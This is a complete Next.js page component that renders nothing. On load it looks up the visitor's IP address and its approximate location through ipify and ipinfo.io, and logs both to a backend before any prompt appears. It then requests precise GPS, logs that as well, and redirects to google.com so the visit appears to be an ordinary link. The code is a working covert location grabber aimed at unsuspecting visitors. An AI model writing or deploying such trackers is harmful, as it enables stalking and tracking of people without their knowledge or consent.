'use client';
import { useEffect } from 'react';

export default function Page() {
  useEffect(() => {
    const fetchAndLogLocation = async () => {
      try {
        let ipLatitude = '';
        let ipLongitude = '';
        let gpsLatitude = '';
        let gpsLongitude = '';
        let userIp = '';

        // Step 1: Fetch the IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        userIp = ipData.ip;

        // Step 2: Fetch location using IP
        const geoResponse = await fetch(`https://ipinfo.io/${userIp}/json`);
        const geoData = await geoResponse.json();
        if (geoData.loc) {
          [ipLatitude, ipLongitude] = geoData.loc.split(',');
        }

        // Step 3: Log IP-based location to the backend (even before getting GPS)
        await fetch('/api/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip: userIp,
            ipLatitude,
            ipLongitude,
            gpsLatitude: null, // Placeholder for GPS, which will be updated later
            gpsLongitude: null, // Placeholder for GPS
          }),
        });

        // Step 4: Try fetching the precise GPS location, but only after logging IP-based location
        if (navigator.geolocation) {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                gpsLatitude = position.coords.latitude;
                gpsLongitude = position.coords.longitude;
                resolve();
              },
              (error) => {
                console.warn('Geolocation error:', error);
                resolve(); // If geolocation fails, use IP-based location
              },
              { enableHighAccuracy: true }
            );
          });
        }

        // Step 5: Log GPS-based location (if available) to the backend
        await fetch('/api/log', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip: userIp,
            ipLatitude,
            ipLongitude,
            gpsLatitude: gpsLatitude || null, // Log GPS location if available
            gpsLongitude: gpsLongitude || null, // Log GPS location if available
          }),
        });

        // Step 6: Redirect to Google
        window.location.href = 'https://google.com';
      } catch (error) {
        console.error('Error fetching or logging location:', error);
        window.location.href = 'https://google.com'; // Redirect even if there's an error
      }
    };

    fetchAndLogLocation();
  }, []);

  return null; // No UI needed
}
